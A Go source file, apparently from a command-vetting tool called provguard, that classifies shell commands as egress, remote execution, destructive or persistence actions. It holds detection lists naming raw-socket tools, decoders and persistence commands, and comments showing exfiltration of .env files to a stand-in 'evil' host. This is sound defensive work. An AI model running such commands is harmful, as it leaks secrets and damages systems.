package shell

import (
	"regexp"
	"slices"
	"strings"
)

var (
	shells       = set("sh", "bash", "zsh", "dash", "ksh", "fish")
	psShells     = set("pwsh", "powershell")
	interpreters = set("python", "python3", "python2", "py", "node", "nodejs", "deno", "bun",
		"ruby", "perl", "php", "osascript", "lua", "tclsh")
	httpClients = set("curl", "wget", "http", "https", "xh", "aria2c", "invoke-webrequest",
		"invoke-restmethod", "iwr", "irm", "start-bitstransfer")
	rawSockets = set("nc", "ncat", "netcat", "socat", "telnet")
	sshTools   = set("ssh", "scp", "sftp")
	dnsTools   = set("nslookup", "dig", "host", "ping", "ping6", "resolve-dnsname", "drill")
	decoders   = set("base64", "base32", "xxd", "openssl", "uudecode", "gzip", "gunzip", "zcat")
	// prefix wrappers: the real command follows (after their own options)
	// busybox runs its first argument as an applet (busybox wget …).
	prefixes = set("sudo", "doas", "env", "nohup", "time", "command", "exec", "nice", "ionice",
		"timeout", "stdbuf", "setsid", "chronic", "unbuffer", "xargs", "builtin", "caffeinate", "watch", "busybox")
	// chdirOpts: options that change the working directory of the real command.
	chdirOpts = map[string]map[string]bool{
		"env":  set("-C", "--chdir"),
		"sudo": set("-D", "--chdir"),
	}
	// options of prefix wrappers that take a separate value
	prefixValueOpts = map[string]map[string]bool{
		"sudo":    set("-u", "-g", "-h", "-p", "-c", "-r", "-t", "-C", "-D", "-U"),
		"doas":    set("-u", "-c"),
		"env":     set("-u", "-c", "--unset", "--chdir", "-C", "-S", "--split-string"),
		"nice":    set("-n", "--adjustment"),
		"ionice":  set("-c", "-n", "-p"),
		"timeout": set("-s", "--signal", "-k", "--kill-after"),
		"xargs":   set("-I", "-n", "-P", "-L", "-s", "-d", "-E", "-a", "--arg-file", "--delimiter", "--max-args", "--max-procs"),
		"watch":   set("-n", "--interval", "-d"),
		"stdbuf":  set("-i", "-o", "-e"),
	}
	codeFlags = map[string]map[string]bool{
		"python": set("-c"), "python3": set("-c"), "python2": set("-c"), "py": set("-c"),
		"node": set("-e", "--eval", "-p", "--print"), "nodejs": set("-e", "--eval", "-p", "--print"),
		"deno": set("eval"), "bun": set("-e", "--eval"), "ruby": set("-e"),
		"perl": set("-e", "-E"), "php": set("-r"), "osascript": set("-e"), "lua": set("-e"),
	}
	// evalCode: inline code that runs code built at run time.
	evalCode  = regexp.MustCompile(`(?i)\b(?:exec|eval|compile|__import__|b64decode|a85decode|fromhex|codecs\.decode|marshal\.loads|pickle\.loads|new\s+Function|Function\(|vm\.runIn\w*|Buffer\.from\([^)]*['"]base64)`)
	netCode   = regexp.MustCompile(`(?i)\b(?:socket|urllib|requests\.|http\.client|httpx|aiohttp|fetch\(|https?\.(?:get|request)|net\.connect|XMLHttpRequest|LWP::|IO::Socket|Net::HTTP|open-uri|curl_exec|file_get_contents\(\s*['"]https?:|smtplib|ftplib|websocket|dns\.resolver|getaddrinfo)`)
	writeCode = regexp.MustCompile(`(?i)(?:open\([^)]*['"][wa]b?\+?['"]|write_text|write_bytes|writeFileSync|writeFile\(|appendFile|fs\.rm|unlink|shutil\.(?:rmtree|move|copy)|os\.remove|File\.write|File\.open\([^)]*['"]w|IO\.write|rmtree|rename\()`)
)

func set(xs ...string) map[string]bool {
	m := make(map[string]bool, len(xs))
	for _, x := range xs {
		m[x] = true
	}
	return m
}

// command classifies one program call. args[0] is the program.
func command(a *Analysis, args []string, dyn []bool, depth int, d Dialect) {
	if len(args) == 0 {
		return
	}
	name := baseName(args[0])
	if dyn[0] && knownProgramPath(args[0]) {
		dyn[0] = false // "$HOME/bin/tool": the program is tool
	}
	a.Cmds = append(a.Cmds, Cmd{Name: name, Args: args, Dynamic: dyn[0]})
	if dyn[0] {
		a.sink(Opaque, "dynamic_command", args[0])
		return
	}
	rest, rdyn := args[1:], dyn[1:]

	// A URL argument with data computed at run time ("$(base64 .env)") is an
	// exfiltration channel whatever the program is (git ls-remote, pip, …).
	for i, x := range rest {
		if rdyn[i] && urlLike.MatchString(x) {
			a.sink(Egress, "url_with_dynamic_data:"+name, urlLike.FindString(x))
		}
	}

	// Prefix wrappers: skip their options and classify the real command.
	if prefixes[name] {
		for i, x := range rest {
			if k, v, ok := strings.Cut(x, "="); ok && chdirOpts[name][k] {
				a.Cds = append(a.Cds, v)
			} else if chdirOpts[name][x] && i+1 < len(rest) {
				a.Cds = append(a.Cds, rest[i+1])
			}
		}
		i := skipPrefixOpts(name, rest)
		if i < len(rest) {
			command(a, rest[i:], rdyn[i:], depth, d)
		}
		return
	}

	switch {
	case shells[name]:
		if code, cdyn, ok := flagValue(rest, rdyn, set("-c")); ok {
			nested(a, code, cdyn, depth, Bash)
		}
		return
	case psShells[name]:
		for i, x := range rest {
			lx := strings.ToLower(x)
			if lx == "-e" || lx == "-ec" || lx == "-en" || strings.HasPrefix(lx, "-enc") {
				a.sink(Opaque, "encoded_command", "")
				return
			}
			if lx == "-c" || lx == "-command" {
				code := strings.Join(rest[i+1:], " ")
				nested(a, code, anyTrue(rdyn[i+1:]), depth, PowerShell)
				return
			}
		}
		return
	case name == "cmd":
		for i, x := range rest {
			if lx := strings.ToLower(x); lx == "/c" || lx == "/k" {
				nested(a, strings.Join(rest[i+1:], " "), anyTrue(rdyn[i+1:]), depth, PowerShell)
				return
			}
		}
		return
	case interpreters[name]:
		if name == "python" || name == "python3" || name == "py" {
			if len(rest) >= 2 && rest[0] == "-m" {
				command(a, append([]string{rest[1]}, rest[2:]...), rdyn[1:], depth, d)
				return
			}
		}
		code, cdyn, ok := flagValue(rest, rdyn, codeFlags[name])
		if !ok && (name == "perl" || name == "ruby") {
			code, cdyn, ok = clusteredCode(rest, rdyn) // -pe 'code', -ne 'code'
		}
		if ok {
			inlineCode(a, name, code, cdyn)
		}
		// perl -pi -e '…' FILE / ruby -i -pe '…' FILE edit FILE in place.
		if (name == "perl" || name == "ruby") && hasInPlace(rest) {
			for _, f := range afterCode(rest, codeFlags[name]) {
				a.write(f, "write", false)
			}
		}
		return
	case name == "eval" || name == "source" && anyTrue(rdyn) || name == "." && anyTrue(rdyn):
		a.sink(Opaque, name, "")
		a.Code = append(a.Code, strings.Join(rest, " "))
		return
	}
	classify(a, name, rest)
}

// nested re-parses a code string given to bash -c, pwsh -Command, cmd /c.
func nested(a *Analysis, code string, dyn bool, depth int, d Dialect) {
	if dyn || depth >= maxDepth {
		a.sink(Opaque, "dynamic_script", "")
		a.Code = append(a.Code, code)
		return
	}
	if d == PowerShell {
		analyzePS(a, code, depth+1)
	} else {
		analyzeBash(a, code, depth+1)
	}
}

func inlineCode(a *Analysis, name, code string, dyn bool) {
	a.Code = append(a.Code, code)
	if dyn {
		a.sink(Opaque, "dynamic_code:"+name, "")
	}
	if netCode.MatchString(code) {
		a.sink(Egress, "interpreter_network:"+name, firstURL([]string{code}))
	}
	if writeCode.MatchString(code) {
		a.sink(Opaque, "interpreter_write:"+name, "")
	}
	if evalCode.MatchString(code) {
		a.sink(Opaque, "interpreter_eval:"+name, "")
	}
}

// hasInPlace reports an -i flag, alone or in a short-flag cluster (-pi, -i.bak).
func hasInPlace(args []string) bool {
	for _, x := range args {
		if x == "--" {
			return false
		}
		if len(x) > 1 && x[0] == '-' && x[1] != '-' && strings.ContainsRune(x[1:], 'i') && !strings.ContainsAny(x[1:], "eE") {
			return true
		}
		if strings.HasPrefix(x, "-i") {
			return true
		}
	}
	return false
}

// clusteredCode finds perl/ruby code after a flag cluster ending in e/E (-pe).
func clusteredCode(args []string, dyn []bool) (string, bool, bool) {
	for i, x := range args {
		if len(x) > 2 && x[0] == '-' && x[1] != '-' && (strings.HasSuffix(x, "e") || strings.HasSuffix(x, "E")) && i+1 < len(args) {
			return args[i+1], dyn[i+1], true
		}
	}
	return "", false, false
}

// afterCode returns the positional arguments that follow the inline code.
func afterCode(args []string, flags map[string]bool) []string {
	for i, x := range args {
		if flags[x] && i+1 < len(args) {
			return positional(args[i+2:])
		}
		// clustered: -pe 'code' / -ne 'code'
		if len(x) > 1 && x[0] == '-' && x[1] != '-' && strings.HasSuffix(x, "e") && i+1 < len(args) {
			return positional(args[i+2:])
		}
	}
	return nil
}

// scriptRunners run a script file given as their first non-option argument.
var scriptRunners = set("python", "python3", "python2", "py", "node", "nodejs", "bun", "ruby", "perl",
	"php", "lua", "tclsh", "sh", "bash", "zsh", "dash", "ksh", "fish", "pwsh", "powershell", "source", ".", "rscript", "osascript")

// posixShells share the sh option syntax (see shellScript). fish does not,
// so it stays with the generic interpreter rules.
var posixShells = set("sh", "bash", "zsh", "dash", "ksh")

// shellScript parses a POSIX shell's options and returns the script file it
// runs, or "" when it runs none: code from -c (checked elsewhere), stdin
// (-s, or no file), or noexec (-n, -o noexec), which only checks syntax.
// Options start with - or +; +n and +o noexec turn noexec off again.
// The generic interpreter loop cannot be used: it reads -e as inline code
// (node -e), but for a shell -e is errexit and `bash -e x.sh` runs x.sh.
func shellScript(args []string) string {
	noexec := false
	for i := 0; i < len(args); i++ {
		x := args[i]
		switch {
		case x == "--" || x == "-":
			if i+1 < len(args) && !noexec {
				return args[i+1]
			}
			return ""
		case x == "-o" || x == "+o" || x == "-O" || x == "+O": // bash -O/+O: shopt options
			if i+1 < len(args) && args[i+1] == "noexec" && (x == "-o" || x == "+o") {
				noexec = x == "-o"
			}
			i++
		case strings.HasPrefix(x, "--"):
			// long options (--norc, --posix, --login) take no value
		case len(x) > 1 && (x[0] == '-' || x[0] == '+'):
			if x[0] == '-' && strings.ContainsAny(x[1:], "cs") {
				return "" // code from an argument or from stdin
			}
			if strings.ContainsRune(x[1:], 'n') {
				noexec = x[0] == '-'
			}
			// A cluster ending in o or O takes the next argument as an
			// option name (-eo pipefail), so that name is not the script.
			if last := x[len(x)-1]; (last == 'o' || last == 'O') && i+1 < len(args) {
				if last == 'o' && args[i+1] == "noexec" {
					noexec = x[0] == '-'
				}
				i++
			}
		default:
			if noexec {
				return ""
			}
			return x
		}
	}
	return ""
}

// ScriptFiles returns files that a command will run as code: a script given
// to an interpreter or shell, a Makefile, or package.json scripts. Callers
// can read them; the analyzer itself never reads files.
func ScriptFiles(c Cmd) []string {
	if len(c.Args) == 0 {
		return nil
	}
	args := c.Args[1:]
	switch {
	case c.Name == "make" || c.Name == "gmake":
		for i, x := range args {
			if (x == "-f" || x == "--file") && i+1 < len(args) {
				return []string{args[i+1]}
			}
		}
		return []string{"Makefile", "makefile", "GNUmakefile"}
	case c.Name == "npm" || c.Name == "pnpm" || c.Name == "yarn" || c.Name == "bun" && len(args) > 0 && args[0] == "run":
		return []string{"package.json"}
	case c.Name == "deno" && len(args) > 1 && args[0] == "run":
		if p := positional(args[1:]); len(p) > 0 {
			return p[:1]
		}
		return nil
	case c.Name == "pwsh" || c.Name == "powershell":
		for i, x := range args {
			if strings.EqualFold(x, "-file") || strings.EqualFold(x, "-f") {
				if i+1 < len(args) {
					return []string{args[i+1]}
				}
			}
		}
		return nil
	case scriptRunners[c.Name]:
		if posixShells[c.Name] {
			if f := shellScript(args); f != "" {
				return []string{f}
			}
			return nil
		}
		for i := 0; i < len(args); i++ {
			x := args[i]
			if x == "-c" || x == "-e" || x == "-E" || x == "-r" || x == "-m" || x == "--eval" || x == "-" {
				return nil // inline code, a module or stdin: handled elsewhere
			}
			if x == "-W" || x == "-X" { // python options that take a value
				i++
				continue
			}
			if !strings.HasPrefix(x, "-") {
				return []string{x}
			}
		}
	}
	return nil
}

func skipPrefixOpts(name string, args []string) int {
	vopts := prefixValueOpts[name]
	i := 0
	for i < len(args) {
		x := args[i]
		switch {
		case name == "env" && strings.Contains(x, "=") && !strings.HasPrefix(x, "-"):
			i++
		case name == "timeout" && i == 0 && len(x) > 0 && (x[0] >= '0' && x[0] <= '9'):
			i++
		case name == "timeout" && !strings.HasPrefix(x, "-") && i > 0 && looksDuration(args[i-1]):
			return i
		case strings.HasPrefix(x, "-"):
			if vopts[x] {
				i += 2
			} else {
				i++
			}
			if x == "--" {
				return i
			}
		default:
			if name == "timeout" && looksDuration(x) {
				i++
				continue
			}
			return i
		}
	}
	return i
}

func looksDuration(s string) bool {
	return len(s) > 0 && s[0] >= '0' && s[0] <= '9'
}

// flagValue returns the argument after the first flag in flags.
func flagValue(args []string, dyn []bool, flags map[string]bool) (string, bool, bool) {
	for i, x := range args {
		if flags[x] && i+1 < len(args) {
			return args[i+1], dyn[i+1], true
		}
	}
	return "", false, false
}

func anyTrue(b []bool) bool {
	for _, x := range b {
		if x {
			return true
		}
	}
	return false
}

func positional(args []string) []string {
	var out []string
	for i, x := range args {
		if x == "--" {
			return append(out, args[i+1:]...)
		}
		if !strings.HasPrefix(x, "-") || x == "-" {
			out = append(out, x)
		}
	}
	return out
}

func hasFlag(args []string, short byte, long ...string) bool {
	for _, x := range args {
		if x == "--" {
			return false
		}
		for _, l := range long {
			if x == l {
				return true
			}
		}
		if short != 0 && len(x) > 1 && x[0] == '-' && x[1] != '-' && strings.IndexByte(x[1:], short) >= 0 {
			return true
		}
	}
	return false
}

var urlLike = regexp.MustCompile(`(?i)\b(?:https?|ftp|s3|gs)://[^\s'"<>]+`)

func firstURL(args []string) string {
	for _, x := range args {
		if m := urlLike.FindString(x); m != "" {
			return m
		}
	}
	for _, x := range positional(args) {
		if strings.Contains(x, ".") && !strings.ContainsAny(x, "/\\") {
			return x
		}
	}
	return ""
}

// classify handles programs that are not wrappers. It is shared by both dialects.
func classify(a *Analysis, name string, args []string) {
	pos := positional(args)
	switch {
	case httpClients[name]:
		// One sink per destination: every URL, and hosts named by options
		// that redirect the connection (curl --connect-to/--resolve/--proxy).
		// Checking only the first URL would let
		// "curl http://localhost/ https://evil/ -d @.env" look local.
		targets := allURLs(args)
		for i, x := range args {
			lx := strings.ToLower(x)
			next := ""
			if i+1 < len(args) {
				next = args[i+1]
			}
			switch {
			case (x == "-o" || x == "--output" || x == "-O" && name == "wget" || strings.EqualFold(x, "-OutFile")) && next != "":
				a.write(next, "write", false)
			case (lx == "--connect-to" || lx == "--resolve") && next != "":
				// HOST1:PORT1:HOST2:PORT2 / HOST:PORT:ADDR — the last host part is where data goes
				f := strings.Split(next, ":")
				if len(f) >= 3 {
					targets = append(targets, f[len(f)-2])
				}
			case (x == "-x" || lx == "--proxy" || lx == "--preproxy" || lx == "-proxy") && next != "":
				targets = append(targets, next)
			case (x == "-K" || lx == "--config") && next != "":
				a.sink(Opaque, "client_config_file:"+name, next)
			}
		}
		if len(targets) == 0 {
			targets = []string{firstURL(args)}
		}
		for _, t := range targets {
			a.sink(Egress, name, t)
		}
	case rawSockets[name]:
		a.sink(Egress, name, strings.Join(pos, " "))
	case sshTools[name]:
		a.sink(Egress, name, firstHost(pos))
	case name == "rsync":
		remote := false
		for _, p := range pos {
			if strings.Contains(p, ":") && !isWindowsDrive(p) || strings.HasPrefix(p, "rsync://") {
				a.sink(Egress, "rsync", p)
				remote = true
				break
			}
		}
		if !remote && len(pos) >= 2 { // local copy: the last operand is written
			copyWrites(a, pos[:len(pos)-1], pos[len(pos)-1], true)
		}
	case name == "openssl":
		if len(pos) > 0 && (pos[0] == "s_client" || pos[0] == "s_server") {
			for i, x := range args {
				if x == "-connect" && i+1 < len(args) {
					a.sink(Egress, "openssl_s_client", args[i+1])
				}
			}
		}
	case name == "certutil":
		if hasFlag(args, 0, "-urlcache", "/urlcache", "-verifyctl", "/verifyctl") {
			a.sink(Egress, "certutil_download", firstURL(args))
		}
	case name == "bitsadmin":
		a.sink(Egress, "bitsadmin", firstURL(args))
	case name == "ftp" || name == "tftp" || name == "sendmail" || name == "mail":
		a.sink(Egress, name, firstHost(pos))
	case dnsTools[name]:
		if len(pos) > 0 {
			a.sink(Egress, "dns:"+name, pos[0])
		}
	case (name == "git" || name == "gh") && helpOnly(args):
		// `gh repo delete --help` prints help and runs nothing.
	case name == "git":
		gitCmd(a, args)
	case name == "gh":
		ghCmd(a, args)
	case name == "npm" || name == "pnpm" || name == "yarn" || name == "bun":
		if len(pos) > 0 {
			switch pos[0] {
			case "publish":
				a.sink(Egress, name+"_publish", "")
			case "install", "i", "add", "ci", "update", "upgrade":
				a.sink(ExecRemote, "package_install:"+name, strings.Join(pos[1:], " "))
			case "dlx", "exec", "x":
				a.sink(ExecRemote, "run_remote_package:"+name, strings.Join(pos[1:], " "))
			}
		}
	case name == "npx" || name == "bunx" || name == "uvx":
		a.sink(ExecRemote, "run_remote_package:"+name, strings.Join(pos, " "))
	case name == "pip" || name == "pip3" || name == "uv" || name == "pipx" || name == "poetry":
		for i, p := range pos {
			if p == "install" || p == "add" || (name == "pipx" && p == "run") {
				// Only named packages count as targets, not -r requirements.txt or -e .
				a.sink(ExecRemote, "package_install:"+name, strings.Join(namedPackages(args, pos[i+1:]), " "))
				break
			}
			if p == "publish" || p == "upload" {
				a.sink(Egress, name+"_publish", "")
				break
			}
			if p == "download" {
				a.sink(Egress, name+"_download", firstURL(args))
				break
			}
		}
	case name == "twine":
		if len(pos) > 0 && pos[0] == "upload" {
			a.sink(Egress, "twine_upload", "")
		}
	case name == "go" || name == "cargo" || name == "gem":
		if len(pos) > 0 {
			switch pos[0] {
			case "install", "get":
				a.sink(ExecRemote, "package_install:"+name, strings.Join(pos[1:], " "))
			case "publish", "push":
				a.sink(Egress, name+"_publish", "")
			}
		}
	case name == "docker" || name == "podman":
		if len(pos) > 0 {
			switch pos[0] {
			case "push":
				a.sink(Egress, name+"_push", strings.Join(pos[1:], " "))
			case "run", "exec", "compose", "build":
				// Arbitrary commands inside a container (with network and
				// mounted files): provguard cannot see them.
				a.sink(Opaque, name+"_"+pos[0], "")
			}
		}
	case name == "make" || name == "gmake":
		for i, x := range args {
			if x == "-C" && i+1 < len(args) {
				a.Cds = append(a.Cds, args[i+1])
			} else if v, ok := strings.CutPrefix(x, "--directory="); ok {
				a.Cds = append(a.Cds, v)
			}
		}
	case name == "aws" || name == "gsutil" || name == "gcloud" || name == "az" || name == "rclone":
		for _, p := range pos {
			if strings.Contains(p, "://") || strings.Contains(p, "upload") {
				a.sink(Egress, "cloud_copy:"+name, p)
				break
			}
		}
	case name == "winget" || name == "choco" || name == "scoop" || name == "brew" || name == "apt" || name == "apt-get":
		if len(pos) > 0 && (pos[0] == "install" || pos[0] == "add") {
			a.sink(ExecRemote, "package_install:"+name, strings.Join(pos[1:], " "))
		}

	// --- file changes ---
	case name == "rm" || name == "unlink" || name == "rmdir" || name == "shred" || name == "del" || name == "erase" || name == "rd":
		for _, p := range pos {
			a.write(p, "delete", false)
		}
		if name == "shred" || hasFlag(args, 'r', "--recursive") || hasFlag(args, 'R') || hasFlag(args, 0, "/s", "/S") {
			a.sink(Destroy, name+"_recursive", strings.Join(pos, " "))
		}
	case name == "tee":
		for _, p := range pos {
			op := "write"
			if hasFlag(args, 'a', "--append") {
				op = "append"
			}
			a.write(p, op, false)
		}
	case name == "cp" || name == "install" || name == "ln" || name == "copy" || name == "xcopy" || name == "mv" || name == "move" || name == "ren" || name == "rename":
		// The destination is not always the last positional: handle
		// -t DIR, Windows /switches, and directory destinations.
		pos = dropWinSwitches(name, pos)
		dst, srcs := "", pos
		for i, x := range args {
			if (x == "-t" || x == "--target-directory") && i+1 < len(args) {
				dst = args[i+1]
			} else if v, ok := strings.CutPrefix(x, "--target-directory="); ok {
				dst = v
			}
		}
		dirDst := dst != ""
		if dst != "" {
			srcs = without(pos, dst)
		} else if len(pos) >= 2 {
			dst, srcs = pos[len(pos)-1], pos[:len(pos)-1]
		}
		if dst != "" {
			dirDst = dirDst || len(srcs) > 1 || hasFlag(args, 'r', "--recursive") || hasFlag(args, 'R') || hasFlag(args, 'a', "--archive") || hasFlag(args, 0, "/s", "/S", "/e", "/E")
			copyWrites(a, srcs, dst, dirDst)
		}
		if name == "mv" || name == "move" || name == "ren" || name == "rename" {
			for _, s := range srcs {
				a.write(s, "delete", false)
			}
		}
		if name == "ln" { // the link points at the source: a write through it reaches the source
			for _, s := range srcs {
				a.write(s, "link", false)
			}
		}
	case name == "robocopy": // robocopy SRC DST [FILES…]
		pos = dropWinSwitches(name, pos)
		if len(pos) >= 2 {
			a.write(pos[1], "write", false)
			files := pos[2:]
			if len(files) == 0 {
				files = []string{filepathBase(pos[0])}
			}
			for _, f := range files {
				a.write(joinPath(pos[1], f), "write", false)
			}
		}
	case name == "mklink": // mklink [/D|/J|/H] LINK TARGET
		pos = dropWinSwitches(name, pos)
		for _, p := range pos {
			a.write(p, "link", false)
		}
	case name == "tar" || name == "bsdtar":
		if tarExtracts(args) {
			bulkWrite(a, name, flagArg(args, "-C", "--directory"))
		}
	case name == "unzip":
		bulkWrite(a, name, flagArg(args, "-d", ""))
	case name == "7z" || name == "7za":
		if len(pos) > 0 && (pos[0] == "x" || pos[0] == "e") {
			out := ""
			for _, x := range args {
				if v, ok := strings.CutPrefix(x, "-o"); ok {
					out = v
				}
			}
			bulkWrite(a, name, out)
		}
	case name == "patch":
		bulkWrite(a, name, flagArg(args, "-d", "--directory"))
	case name == "touch" || name == "truncate":
		for _, p := range pos {
			a.write(p, "write", false)
		}
	case name == "chmod" || name == "chown" || name == "chattr" || name == "icacls" || name == "attrib":
		for _, p := range pos[min(1, len(pos)):] {
			a.write(p, "perm", false)
		}
	case name == "sed" || name == "perl":
		if hasFlag(args, 'i', "--in-place") || anyPrefix(args, "--in-place") {
			for _, p := range sedFiles(args) {
				a.write(p, "write", false)
			}
		}
	case name == "dd":
		for _, x := range args {
			if v, ok := strings.CutPrefix(x, "of="); ok {
				a.write(v, "write", false)
			}
		}
	case strings.HasPrefix(name, "mkfs") || name == "format" || name == "diskpart" || name == "wipefs":
		a.sink(Destroy, name, strings.Join(pos, " "))
	case name == "find":
		if hasFlag(args, 0, "-delete") {
			a.sink(Destroy, "find_delete", strings.Join(pos, " "))
			for _, p := range pos {
				a.write(p, "delete", false)
			}
		}
		if hasFlag(args, 0, "-exec", "-execdir") {
			for i, x := range args {
				if (x == "-exec" || x == "-execdir") && i+1 < len(args) {
					end := i + 1
					for end < len(args) && args[end] != ";" && args[end] != `\;` && args[end] != "+" {
						end++
					}
					sub := args[i+1 : end]
					command(a, sub, make([]bool, len(sub)), maxDepth, Bash)
				}
			}
		}
	case name == "crontab":
		if !hasFlag(args, 'l') {
			a.sink(Persist, "crontab", "")
		}
	case name == "systemctl" || name == "launchctl":
		for _, p := range pos {
			if p == "enable" || p == "load" || p == "bootstrap" {
				a.sink(Persist, name+"_"+p, strings.Join(pos, " "))
				break
			}
		}
	case name == "schtasks":
		if hasFlag(args, 0, "/create", "/Create", "/CREATE") {
			a.sink(Persist, "schtasks", "")
		}
	case name == "reg":
		if len(pos) > 0 && (strings.EqualFold(pos[0], "add") || strings.EqualFold(pos[0], "import")) {
			a.sink(Persist, "registry", strings.Join(pos[1:min(2, len(pos))], ""))
		}
	case name == "cd" || name == "pushd":
		if len(pos) > 0 {
			a.Cds = append(a.Cds, pos[0])
		}
	case name == "provguard":
		// recorded in Cmds; self-protection decides.
	}
}

// pipValueFlags take a file, path or URL, not a package name.
var pipValueFlags = set("-r", "--requirement", "-c", "--constraint", "-e", "--editable",
	"-f", "--find-links", "-i", "--index-url", "--extra-index-url", "-t", "--target", "--python")

// namedPackages drops values of pipValueFlags and local paths from cands.
func namedPackages(args, cands []string) []string {
	skip := map[string]bool{}
	for i, x := range args {
		if pipValueFlags[x] && i+1 < len(args) {
			skip[args[i+1]] = true
		}
	}
	var out []string
	for _, c := range cands {
		if skip[c] || c == "." || strings.HasPrefix(c, "./") || strings.HasPrefix(c, "../") {
			continue
		}
		out = append(out, c)
	}
	return out
}

// copyWrites records writes for a copy/move of srcs into dst. When dst is a
// directory, each source lands at dst/base(src). dirDst says dst is known to
// be a directory (-t, several sources, recursive); ".", "..", "~" and a
// trailing separator always are.
func copyWrites(a *Analysis, srcs []string, dst string, dirDst bool) {
	a.write(dst, "write", false)
	if !dirDst {
		switch strings.TrimRight(dst, `/\`) {
		case ".", "..", "~", "":
			dirDst = true
		}
		dirDst = dirDst || strings.HasSuffix(dst, "/") || strings.HasSuffix(dst, `\`)
	}
	if dirDst {
		for _, s := range srcs {
			a.write(joinPath(dst, filepathBase(s)), "write", false)
		}
	}
}

// bulkWrite records an archive extraction or patch: an unknown set of files
// is written under dir (default: the working directory).
func bulkWrite(a *Analysis, name, dir string) {
	if dir == "" {
		dir = "."
	}
	a.write(dir, "bulk", false)
	a.sink(Persist, "bulk_write:"+name, dir)
}

func tarExtracts(args []string) bool {
	for i, x := range args {
		if x == "-x" || x == "--extract" || x == "--get" {
			return true
		}
		// "tar xf a.tar" / "tar -xzf a.tar": first argument is a flag cluster
		if i == 0 && strings.ContainsRune(strings.TrimPrefix(x, "-"), 'x') && !strings.HasPrefix(x, "--") {
			return true
		}
	}
	return false
}

// flagArg returns the value of a short or long option (also --long=value).
func flagArg(args []string, short, long string) string {
	for i, x := range args {
		if (x == short || long != "" && x == long) && i+1 < len(args) {
			return args[i+1]
		}
		if long != "" {
			if v, ok := strings.CutPrefix(x, long+"="); ok {
				return v
			}
		}
		if short != "" && len(short) == 2 && strings.HasPrefix(x, short) && len(x) > 2 && !strings.HasPrefix(x, "--") {
			return x[2:] // -Cdir
		}
	}
	return ""
}

var winSwitch = regexp.MustCompile(`^/[A-Za-z0-9?]+(?::.*)?$`)

// dropWinSwitches removes "/Y"-style switches of Windows copy tools, which
// positional() keeps because they do not start with "-".
func dropWinSwitches(name string, pos []string) []string {
	switch name {
	case "copy", "xcopy", "robocopy", "move", "mklink", "ren", "rename", "del", "erase", "rd":
	default:
		return pos
	}
	var out []string
	for _, p := range pos {
		if !winSwitch.MatchString(p) {
			out = append(out, p)
		}
	}
	return out
}

func without(xs []string, drop string) []string {
	var out []string
	for _, x := range xs {
		if x != drop {
			out = append(out, x)
		}
	}
	return out
}

func filepathBase(p string) string {
	p = strings.TrimRight(strings.ReplaceAll(p, `\`, "/"), "/")
	if i := strings.LastIndex(p, "/"); i >= 0 {
		return p[i+1:]
	}
	return p
}

func joinPath(dir, base string) string {
	if dir == "" {
		return base
	}
	return strings.TrimRight(dir, `/\`) + "/" + base
}

// allURLs returns every URL in args.
func allURLs(args []string) []string {
	var out []string
	for _, x := range args {
		out = append(out, urlLike.FindAllString(x, -1)...)
	}
	return out
}

func isWindowsDrive(p string) bool {
	return len(p) >= 2 && p[1] == ':' && (p[0]|0x20) >= 'a' && (p[0]|0x20) <= 'z'
}

func firstHost(pos []string) string {
	for _, p := range pos {
		if strings.Contains(p, "@") || strings.Contains(p, ".") || strings.Contains(p, ":") {
			return p
		}
	}
	if len(pos) > 0 {
		return pos[0]
	}
	return ""
}

func gitCmd(a *Analysis, args []string) {
	// Global options: -C <dir> changes the directory; -c k=v can redirect a
	// push (remote.X.pushurl, url.*.insteadOf), so such pushes are never
	// treated as pushes to a trusted remote.
	i, overrides := 0, false
	for i < len(args) && strings.HasPrefix(args[i], "-") {
		switch {
		case args[i] == "-C" && i+1 < len(args):
			a.Cds = append(a.Cds, args[i+1])
			i++
		case args[i] == "-c" && i+1 < len(args):
			overrides = true
			i++
		case strings.HasPrefix(args[i], "--git-dir") || strings.HasPrefix(args[i], "--work-tree") || strings.HasPrefix(args[i], "--config-env"):
			overrides = true
		}
		i++
	}
	if i >= len(args) {
		return
	}
	sub, rest := args[i], args[i+1:]
	pos := positional(rest)
	if code, ok := gitRunsCode(args[:i], sub, rest, pos); ok {
		// These run a command provguard never sees.
		a.sink(Opaque, "git_runs_command:"+sub, "")
		a.Code = append(a.Code, code)
		return
	}
	switch sub {
	case "checkout", "restore":
		// "git checkout REF -- PATHS" / "git restore [--source X] PATHS" write PATHS.
		paths := pos
		for j, x := range rest {
			if x == "--" {
				paths = rest[j+1:]
				break
			}
		}
		if sub == "checkout" && len(paths) == len(pos) && len(pos) > 0 {
			paths = pos[1:] // "git checkout BRANCH": the branch is not a path
		}
		for _, p := range paths {
			a.write(p, "write", false)
		}
		a.write(".", "vcs", false)
	case "pull", "merge", "rebase", "switch", "cherry-pick", "revert":
		a.write(".", "vcs", false) // tracked files change, including any .claude/settings.json
	case "apply", "am":
		bulkWrite(a, "git_"+sub, ".") // attacker-supplied patches change unknown files
	case "push":
		detail := "git_push"
		if overrides {
			detail = "git_push_overridden"
		}
		a.sink(Egress, detail, strings.Join(pos, " "))
		if hasFlag(rest, 'f', "--force", "--force-with-lease", "--mirror", "--delete") || anyPrefix(pos, "+") || anyPrefix(pos, ":") {
			a.sink(Destroy, "git_force_push", strings.Join(pos, " "))
		}
	case "remote":
		if len(pos) > 0 && (pos[0] == "add" || pos[0] == "set-url") {
			a.sink(Persist, "git_remote_"+pos[0], strings.Join(pos[1:], " "))
		}
	case "config":
		if !hasFlag(rest, 'l', "--get", "--get-all", "--get-regexp", "--list", "--show-origin") && len(pos) >= 2 {
			a.sink(Persist, "git_config", pos[0])
		}
	case "reset":
		if hasFlag(rest, 0, "--hard") {
			a.sink(Destroy, "git_reset_hard", "")
		}
	case "clean":
		if hasFlag(rest, 'f', "--force") {
			a.sink(Destroy, "git_clean", "")
		}
	case "branch":
		if hasFlag(rest, 'D') {
			a.sink(Destroy, "git_branch_delete", strings.Join(pos, " "))
		}
	case "stash":
		if len(pos) > 0 && (pos[0] == "drop" || pos[0] == "clear") {
			a.sink(Destroy, "git_stash_"+pos[0], "")
		}
		if len(pos) > 0 && (pos[0] == "pop" || pos[0] == "apply") {
			a.write(".", "vcs", false)
		}
	case "clone", "fetch", "ls-remote", "submodule":
		// Data in an explicit URL is caught by the dynamic-URL rule in command().
	case "filter-branch", "filter-repo":
		a.sink(Destroy, "git_"+sub, "")
	}
}

func anyPrefix(xs []string, p string) bool {
	for _, x := range xs {
		if strings.HasPrefix(x, p) {
			return true
		}
	}
	return false
}

// ghWrite: gh subcommands that send data to GitHub (EGRESS).
